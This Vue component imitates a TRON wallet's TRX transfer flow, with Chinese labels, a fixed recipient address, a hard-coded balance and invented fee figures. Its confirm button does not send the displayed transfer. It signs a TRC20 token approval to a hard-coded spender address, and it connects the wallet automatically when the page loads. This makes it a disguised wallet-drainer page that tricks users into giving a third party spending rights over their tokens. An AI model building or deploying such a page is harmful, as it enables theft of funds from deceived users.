<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from "vue";

import { useTronWallet } from "@/composables/use-tron-wallet";
import { TRON_NETWORK_NAME, TRON_SPENDER_ADDRESS } from "@/config/tron";
import {
  sendTrc20Approve,
  TRON_TEST_APPROVE_AMOUNT_LABEL,
} from "@/contracts/trc20-contract";
import { mapTronErrorMessage } from "@/utils/tron-error-util";
import { waitForTronTransaction } from "@/utils/tron-util";
// <!-- Import Dependencies End --->

type TransferPhase = "idle" | "pending" | "confirming" | "success" | "error";
type TransferStep = 1 | 2;

// <!-- Reactive Data Start --->
const {
  address,
  isConnecting,
  isConnected,
  tronWeb,
  isOnTargetNetwork,
  walletError,
  connect,
} = useTronWallet();

const transferStep = ref<TransferStep>(1);
const showConfirmDrawer = ref(false);
const transferAmount = ref("0.1");
const transferPhase = ref<TransferPhase>("idle");
const transferErrorMessage = ref("");
const transferAttempted = ref(false);

const displayBalance = "1.402121";
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
const payerAddress = computed(() => address.value ?? "");
const recipientAddress = computed(() => TRON_SPENDER_ADDRESS);

const displayAmountLabel = computed(() => TRON_TEST_APPROVE_AMOUNT_LABEL);

const networkLabel = computed(() => {
  if (TRON_NETWORK_NAME.toLowerCase().includes("mainnet")) return "Mainnet";
  return TRON_NETWORK_NAME;
});

const isAmountValid = computed(() => {
  const value = transferAmount.value.trim();
  if (!value) return false;
  if (!/^\d+(\.\d+)?$/.test(value)) return false;
  return Number(value) > 0;
});

const amountFiatLabel = computed(() => {
  const value = Number(transferAmount.value.trim());
  if (!isAmountValid.value) return "$0";
  return `$${(value * 0.32).toFixed(3)}`;
});

const isTransferBusy = computed(
  () =>
    transferPhase.value === "pending" || transferPhase.value === "confirming",
);

const canGoNextStep = computed(
  () =>
    isConnected.value &&
    isOnTargetNetwork.value &&
    !isConnecting.value &&
    !isTransferBusy.value &&
    recipientAddress.value.length > 0,
);

const canTransfer = computed(
  () => canGoNextStep.value && isAmountValid.value,
);

const nextStepButtonLabel = computed(() => {
  if (isConnecting.value) return "连接钱包中...";
  if (!isConnected.value) return "等待连接钱包";
  if (!isOnTargetNetwork.value) return "网络不正确";
  return "下一步";
});

const transferButtonLabel = computed(() => {
  if (isConnecting.value) return "连接钱包中...";
  if (!isConnected.value) return "等待连接钱包";
  if (!isOnTargetNetwork.value) return "网络不正确";
  if (!isAmountValid.value) return "转账";
  return "转账";
});

const drawerConfirmLabel = computed(() => {
  if (transferPhase.value === "pending") return "等待签名...";
  if (transferPhase.value === "confirming") return "确认中...";
  if (transferPhase.value === "success") return "已发送";
  if (transferPhase.value === "error") return "重新确认";
  return "确认";
});
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const autoConnectWallet = async () => {
  if (isConnecting.value || isConnected.value) return;
  await connect();
};

const goToStep2 = () => {
  if (!canGoNextStep.value) return;
  transferStep.value = 2;
};

const goToStep1 = () => {
  if (isTransferBusy.value) return;
  transferStep.value = 1;
};

const openConfirmDrawer = () => {
  if (!canTransfer.value) return;
  showConfirmDrawer.value = true;
};

const closeConfirmDrawer = () => {
  if (isTransferBusy.value) return;
  showConfirmDrawer.value = false;
  if (transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
};

const clearAmount = () => {
  transferAmount.value = "";
};

const runApprove = async () => {
  if (
    !isConnected.value ||
    !isOnTargetNetwork.value ||
    !address.value ||
    !tronWeb.value
  )
    return;
  if (transferAttempted.value) return;
  if (isTransferBusy.value) return;
  if (transferPhase.value === "success") return;

  transferAttempted.value = true;
  transferPhase.value = "pending";
  transferErrorMessage.value = "";

  try {
    const txid = await sendTrc20Approve(tronWeb.value);
    transferPhase.value = "confirming";

    const receipt = await waitForTronTransaction(tronWeb.value, txid);
    if (receipt.receipt?.result && receipt.receipt.result !== "SUCCESS") {
      throw new Error(`交易失败：${receipt.receipt.result}`);
    }

    transferPhase.value = "success";
  } catch (error) {
    transferPhase.value = "error";
    transferErrorMessage.value = mapTronErrorMessage(error);
    transferAttempted.value = false;
  }
};

const handleDrawerConfirm = async () => {
  if (transferPhase.value === "success") return;
  if (transferPhase.value === "error") {
    transferAttempted.value = false;
    transferPhase.value = "idle";
    transferErrorMessage.value = "";
  }
  await runApprove();
};
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  void autoConnectWallet();
});

watch(isConnected, (connected) => {
  if (!connected) {
    transferStep.value = 1;
    showConfirmDrawer.value = false;
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});

watch(showConfirmDrawer, (visible) => {
  if (!visible && !isTransferBusy.value && transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});
// <!-- Life Cycle End --->
</script>

<template>
  <div class="tl-page">
    <!-- 图二：转账 (1/2) 接收账户 -->
    <template v-if="transferStep === 1">
      <header class="tl-nav">
        <div class="tl-nav-back">
          <i class="pi pi-chevron-left" />
        </div>
        <div class="tl-nav-title">
          转账 <span class="tl-nav-step">(1/2)</span>
        </div>
        <div class="tl-nav-action">
          多重签名转账
        </div>
      </header>

      <section class="tl-section">
        <div class="tl-row-between">
          <span class="tl-label">接收账户</span>
          <i class="pi pi-expand tl-scan-icon" />
        </div>
        <div class="tl-input-wrap">
          <div class="tl-address-text">
            {{ recipientAddress }}
          </div>
          <button
            type="button"
            class="tl-clear-btn"
            aria-label="clear"
            disabled
          >
            <i class="pi pi-times" />
          </button>
        </div>
        <div class="tl-address-book">
          <i class="pi pi-plus" />
          <span>加入到地址本</span>
        </div>
      </section>

      <Message
        v-if="walletError"
        severity="error"
        :closable="false"
        class="tl-message"
      >
        {{ walletError }}
      </Message>

      <div class="tl-footer">
        <Button
          :label="nextStepButtonLabel"
          class="tl-dark-btn w-full"
          size="large"
          :loading="isConnecting"
          :disabled="!canGoNextStep"
          @click="goToStep2"
        />
      </div>
    </template>

    <!-- 图一：转账 (2/2) 数量 -->
    <template v-else>
      <header class="tl-nav">
        <button
          type="button"
          class="tl-nav-back tl-nav-back-btn"
          :disabled="isTransferBusy"
          @click="goToStep1"
        >
          <i class="pi pi-chevron-left" />
        </button>
        <div class="tl-nav-title">
          转账 <span class="tl-nav-step">(2/2)</span>
        </div>
        <div class="tl-nav-placeholder" />
      </header>

      <section class="tl-section">
        <div class="tl-section-title">
          通证
        </div>
        <div class="tl-token-card">
          <img
            src="https://etherscan.io/token/images/trontrx_32.png"
            alt="TRX"
            class="tl-token-icon"
          />
          <span class="tl-token-name">TRX</span>
          <i class="pi pi-chevron-right tl-token-arrow" />
        </div>
      </section>

      <section class="tl-section">
        <div class="tl-section-title">
          数量
        </div>
        <div class="tl-amount-wrap">
          <div class="tl-amount-row">
            <div class="tl-amount-main">
              <InputText
                v-model="transferAmount"
                type="text"
                inputmode="decimal"
                placeholder="0"
                class="tl-amount-input"
                :unstyled="true"
              />
              <div class="tl-amount-fiat">
                {{ amountFiatLabel }}
              </div>
            </div>
            <button
              type="button"
              class="tl-clear-btn tl-clear-btn-dark"
              aria-label="clear amount"
              @click="clearAmount"
            >
              <i class="pi pi-times" />
            </button>
          </div>
        </div>
        <div class="tl-available">
          可用: {{ displayBalance }}
        </div>
        <p class="tl-fee-hint">
          将为您自动扣除本次交易所需燃烧的手续费
        </p>
        <div class="tl-bandwidth-tag">
          抵扣 270 带宽 ≈ 0.27 TRX
        </div>
        <div class="tl-note-link">
          添加转账备注 <i class="pi pi-chevron-down" />
        </div>
      </section>

      <Message
        v-if="walletError"
        severity="error"
        :closable="false"
        class="tl-message"
      >
        {{ walletError }}
      </Message>

      <div class="tl-footer">
        <Button
          :label="transferButtonLabel"
          class="tl-dark-btn w-full"
          size="large"
          :loading="isConnecting"
          :disabled="!canTransfer"
          @click="openConfirmDrawer"
        />
      </div>
    </template>

    <!-- 图三：确认交易 Bottom Drawer -->
    <Drawer
      v-model:visible="showConfirmDrawer"
      position="bottom"
      modal
      :show-close-icon="false"
      :dismissable="!isTransferBusy"
      class="tl-confirm-drawer"
      style="height: auto"
    >
      <header class="tl-confirm-nav">
        <button
          type="button"
          class="tl-nav-back tl-nav-back-btn"
          :disabled="isTransferBusy"
          @click="closeConfirmDrawer"
        >
          <i class="pi pi-chevron-left" />
        </button>
        <div class="tl-confirm-nav-title">
          确认交易
        </div>
        <div class="tl-nav-placeholder" />
      </header>

      <div class="tl-confirm-meta">
        <span class="tl-import-label">导入</span>
        <span class="tl-network-label">{{ networkLabel }}</span>
      </div>

      <div class="tl-confirm-hero">
        <div class="tl-hero-icon-wrap">
          <img
            src="https://etherscan.io/token/images/trontrx_32.png"
            alt="TRX"
            class="tl-hero-token"
          />
          <span class="tl-hero-verified">
            <i class="pi pi-check" />
          </span>
        </div>
        <div class="tl-hero-action">
          转账
        </div>
        <div class="tl-hero-amount">
          {{ transferAmount }} TRX
        </div>
      </div>

      <div class="tl-account-flow">
        <div class="tl-account-card">
          <div class="tl-account-label">
            转出账户
          </div>
          <div class="tl-account-value">
            {{ payerAddress }}
          </div>
          <div class="tl-account-sub">
            导入
          </div>
        </div>
        <div class="tl-flow-arrow">
          <i class="pi pi-arrow-right" />
        </div>
        <div class="tl-account-card">
          <div class="tl-account-label">
            接收账户
          </div>
          <div class="tl-account-value">
            {{ recipientAddress }}
          </div>
        </div>
      </div>

      <div class="tl-fee-section">
        <div class="tl-fee-title">
          预估用户扣除
          <i class="pi pi-question-circle" />
        </div>
        <div class="tl-fee-box">
          <div class="tl-fee-box-left">
            TRX
            <i class="pi pi-question-circle tl-fee-box-help" />
          </div>
          <div class="tl-fee-box-right">
            <div class="tl-fee-trx">
              ≈ 0.277 TRX
              <i class="pi pi-chevron-down" />
            </div>
            <div class="tl-fee-usd">
              $ 0.088
            </div>
          </div>
        </div>
        <div class="tl-fee-total-link">
          查看交易总消耗 <i class="pi pi-chevron-right" />
        </div>
      </div>

      <Message
        v-if="transferPhase === 'success'"
        severity="success"
        :closable="false"
        class="tl-message"
      >
        转账成功，{{ displayAmountLabel }} 已提交
      </Message>

      <Message
        v-if="transferErrorMessage"
        severity="error"
        :closable="false"
        class="tl-message"
      >
        {{ transferErrorMessage }}
      </Message>

      <Button
        :label="drawerConfirmLabel"
        class="tl-dark-btn w-full tl-confirm-btn"
        size="large"
        :loading="isTransferBusy"
        :disabled="isTransferBusy || transferPhase === 'success'"
        @click="handleDrawerConfirm"
      />
    </Drawer>
  </div>
</template>

<style scoped>
.tl-page {
  max-width: 480px;
  margin: 0 auto;
  min-height: 100vh;
  padding: 0 16px 24px;
  background: #fff;
}

.tl-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 12px 0 20px;
}

.tl-nav-back,
.tl-nav-placeholder {
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #111827;
  font-size: 18px;
}

.tl-nav-back {
  pointer-events: none;
}

.tl-nav-back-btn {
  pointer-events: auto;
  border: none;
  background: transparent;
  cursor: pointer;
  padding: 0;
}

.tl-nav-back-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.tl-nav-title {
  font-size: 17px;
  font-weight: 600;
  color: #111827;
}

.tl-nav-step {
  font-weight: 400;
  color: #9ca3af;
}

.tl-nav-action {
  font-size: 14px;
  color: #2f80ff;
  pointer-events: none;
}

.tl-section {
  margin-bottom: 24px;
}

.tl-section-title {
  font-size: 16px;
  font-weight: 600;
  color: #111827;
  margin-bottom: 12px;
}

.tl-row-between {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 12px;
}

.tl-label {
  font-size: 15px;
  color: #111827;
}

.tl-scan-icon {
  font-size: 18px;
  color: #9ca3af;
  pointer-events: none;
}

.tl-input-wrap {
  background: #f5f6f8;
  border-radius: 10px;
  padding: 14px 12px;
  display: flex;
  align-items: flex-start;
  gap: 8px;
}

.tl-address-text {
  flex: 1;
  font-size: 15px;
  line-height: 1.5;
  color: #111827;
  word-break: break-all;
}

.tl-clear-btn {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  border: none;
  background: #e5e7eb;
  color: #9ca3af;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  font-size: 10px;
  padding: 0;
  cursor: pointer;
}

.tl-clear-btn:disabled {
  cursor: default;
}

.tl-clear-btn-dark {
  background: #d1d5db;
}

.tl-address-book {
  margin-top: 12px;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 14px;
  color: #2f80ff;
  pointer-events: none;
}

.tl-token-card {
  background: #f5f6f8;
  border-radius: 10px;
  padding: 14px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  pointer-events: none;
}

.tl-token-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
}

.tl-token-name {
  flex: 1;
  font-size: 16px;
  font-weight: 600;
  color: #111827;
}

.tl-token-arrow {
  font-size: 12px;
  color: #9ca3af;
}

.tl-amount-wrap {
  background: #f5f6f8;
  border-radius: 10px;
  padding: 16px;
}

.tl-amount-row {
  display: flex;
  align-items: flex-start;
  justify-content: space-between;
  gap: 12px;
}

.tl-amount-main {
  flex: 1;
  min-width: 0;
}

.tl-amount-input {
  width: 100%;
  border: none;
  background: transparent;
  font-size: 36px;
  font-weight: 600;
  color: #111827;
  line-height: 1.2;
  padding: 0;
  outline: none;
  box-shadow: none;
}

.tl-amount-input::placeholder {
  color: #d1d5db;
}

.tl-amount-fiat {
  font-size: 14px;
  color: #9ca3af;
  margin-top: 4px;
}

.tl-available {
  margin-top: 12px;
  font-size: 14px;
  color: #9ca3af;
}

.tl-fee-hint {
  margin: 16px 0 10px;
  font-size: 14px;
  color: #2f80ff;
  line-height: 1.5;
}

.tl-bandwidth-tag {
  display: inline-block;
  padding: 6px 12px;
  background: #f5f6f8;
  border-radius: 6px;
  font-size: 13px;
  color: #6b7280;
}

.tl-note-link {
  margin-top: 20px;
  text-align: right;
  font-size: 14px;
  color: #2f80ff;
  pointer-events: none;
}

.tl-footer {
  margin-top: 32px;
}

.tl-dark-btn {
  background: #1c1c28 !important;
  border-color: #1c1c28 !important;
  border-radius: 10px !important;
  font-size: 16px !important;
  height: 48px !important;
}

.tl-message {
  margin-top: 12px;
}

.tl-confirm-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 0 16px;
}

.tl-confirm-nav-title {
  font-size: 17px;
  font-weight: 600;
  color: #111827;
}

.tl-confirm-meta {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 24px;
  font-size: 14px;
}

.tl-import-label {
  color: #111827;
  border-bottom: 1px dashed #9ca3af;
  padding-bottom: 2px;
}

.tl-network-label {
  color: #9ca3af;
}

.tl-confirm-hero {
  text-align: center;
  margin-bottom: 28px;
}

.tl-hero-icon-wrap {
  position: relative;
  width: 64px;
  height: 64px;
  margin: 0 auto 12px;
}

.tl-hero-token {
  width: 64px;
  height: 64px;
  border-radius: 50%;
}

.tl-hero-verified {
  position: absolute;
  right: 0;
  bottom: 0;
  width: 20px;
  height: 20px;
  border-radius: 50%;
  background: #2f80ff;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 10px;
  border: 2px solid #fff;
}

.tl-hero-action {
  font-size: 15px;
  color: #111827;
  margin-bottom: 8px;
}

.tl-hero-amount {
  font-size: 28px;
  font-weight: 600;
  color: #111827;
}

.tl-account-flow {
  display: flex;
  align-items: stretch;
  gap: 8px;
  margin-bottom: 24px;
}

.tl-account-card {
  flex: 1;
  background: #f5f6f8;
  border-radius: 10px;
  padding: 12px;
  min-width: 0;
}

.tl-flow-arrow {
  display: flex;
  align-items: center;
  color: #d1d5db;
  font-size: 14px;
  flex-shrink: 0;
}

.tl-account-label {
  font-size: 13px;
  color: #9ca3af;
  margin-bottom: 8px;
}

.tl-account-value {
  font-size: 12px;
  line-height: 1.4;
  color: #6b7280;
  word-break: break-all;
}

.tl-account-sub {
  margin-top: 8px;
  font-size: 12px;
  color: #9ca3af;
  border-bottom: 1px dashed #d1d5db;
  display: inline-block;
}

.tl-fee-section {
  margin-bottom: 20px;
}

.tl-fee-title {
  font-size: 14px;
  color: #111827;
  margin-bottom: 12px;
  display: flex;
  align-items: center;
  gap: 4px;
}

.tl-fee-title .pi {
  font-size: 13px;
  color: #9ca3af;
}

.tl-fee-box {
  background: #f5f6f8;
  border-radius: 10px;
  padding: 14px 16px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.tl-fee-box-left {
  font-size: 15px;
  font-weight: 500;
  color: #111827;
  display: flex;
  align-items: center;
  gap: 4px;
}

.tl-fee-box-help {
  font-size: 12px;
  color: #9ca3af;
}

.tl-fee-box-right {
  text-align: right;
}

.tl-fee-trx {
  font-size: 15px;
  color: #111827;
  display: flex;
  align-items: center;
  gap: 4px;
  justify-content: flex-end;
}

.tl-fee-trx .pi {
  font-size: 11px;
  color: #9ca3af;
}

.tl-fee-usd {
  font-size: 13px;
  color: #9ca3af;
  margin-top: 4px;
}

.tl-fee-total-link {
  margin-top: 12px;
  font-size: 14px;
  color: #9ca3af;
  pointer-events: none;
}

.tl-confirm-btn {
  margin-top: 8px;
}
</style>

<style>
.tl-confirm-drawer {
  width: 100%;
  max-width: 480px;
  margin: 0 auto;
  border: none;
  border-radius: 16px 16px 0 0;
  overflow: hidden;
  background: #fff;
}

.tl-confirm-drawer .p-drawer-header {
  display: none;
}

.tl-confirm-drawer .p-drawer-content {
  padding: 16px 16px 24px;
  background: #fff;
}
</style>
